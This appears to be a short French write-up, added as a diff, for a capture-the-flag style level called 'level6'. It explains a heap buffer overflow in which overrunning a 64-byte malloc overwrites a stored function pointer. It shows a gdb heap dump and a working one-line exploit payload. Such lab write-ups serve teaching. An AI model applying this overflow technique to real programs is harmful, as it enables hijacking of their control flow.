@@ -1,0 +1,13 @@
+Dans ce niveau nous allons exploiter le buffer overflow a travers la fonction malloc
+
+representation du tas utilise
+(gdb) x/200 0x804a008
+0x804a008:	0x41414141	0x41414141	0x41414141	0x41414141 <--
+0x804a018:	0x41414141	0x41414141	0x41414141	0x41414141 <-- premier malloc 64 octects remplis de 'A'
+0x804a028:	0x41414141	0x41414141	0x41414141	0x41414141 <-- 
+0x804a038:	0x41414141	0x41414141	0x41414141	0x41414141 <--
+0x804a048:	0x00000000	0x00000011	0x08048468	0x00000000 <-- deuxieme malloc remplis avec l'addresse de la fonction M a appeler pour la suite
+
+il suffit donc de remplir le premier malloc de 64 octect de remplir ensuite les 8 prochains octects et ensuite de remplacer l'adresse de M par l'addresse de N
+
+./level6 `python -c 'print("A" * 72 + "\x54\x84\x04\x08")'`
